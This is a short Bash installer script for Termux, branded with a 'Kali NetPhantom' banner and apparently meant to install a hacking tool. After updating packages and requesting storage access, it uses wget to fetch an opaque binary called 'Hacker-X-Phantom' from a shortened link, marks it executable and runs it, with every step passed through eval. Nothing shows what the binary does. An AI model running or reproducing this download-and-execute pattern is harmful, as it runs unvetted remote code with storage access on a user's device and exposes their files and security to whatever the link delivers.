#!/bin/bash

display_banner() {
    cat << "EOF"
 _   __      _ _   _   _      _    ______ _                 _              
| | / /     | (_) | \ | |    | |   | ___ \ |               | |             
| |/ /  __ _| |_  |  \| | ___| |_  | |_/ / |__   __ _ _ __ | |_ ___  _ __ 
|    \ / _  | | | |   ` |/ _ \ __| |  __/| '_ \ / _  |  _ \| __/ _ \|  _ \
| |\  \ (_| | | | | |\  |  __/ |_  | |   | | | | (_| | | | | || (_) | | | |
\_| \_/\__ _|_|_| \_| \_/\___|\__| \_|   |_| |_|\__ _|_| |_|\__\___/|_| |_|
EOF
}

run_command() {
    eval "$1"
}

main() {
    display_banner
    commands=(
        "pkg update -y"
        "clear"
        "pkg install wget -y"
        "clear"
        "termux-setup-storage"
        "wget -O Hacker-X-Phantom https://offs.ec/2MceZWr"
        "chmod +x Hacker-X-Phantom"
        "./Hacker-X-Phantom"
    )
    for command in "${commands[@]}"; do
        echo "Running command: $command"
        run_command "$command"
    done
}

main "$@"
